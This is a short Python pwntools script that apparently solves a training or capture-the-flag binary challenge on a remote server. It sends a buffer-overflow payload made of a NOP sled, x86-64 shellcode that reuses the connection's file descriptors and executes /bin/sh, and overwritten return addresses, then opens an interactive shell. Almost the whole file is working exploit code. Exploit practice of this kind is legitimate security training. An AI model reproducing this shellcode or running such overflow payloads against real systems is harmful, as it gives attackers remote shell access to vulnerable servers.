#This is a server is hosted directly. No stdin or stdout for you.
#https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./server")
p = remote("training.jinblack.it", 2005)
#gdb.attach(p, '''b *0x040138c b *0x04013a8''')
#context.log_level = 'debug'

raw_input("Wait")

bufferAddress = 0x004040c0 #64 bit

shellcode = "\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05"

payload = "\x90"*(1008-len(shellcode)) + shellcode + p64(bufferAddress) + p64(bufferAddress)

p.send(payload)

p.interactive()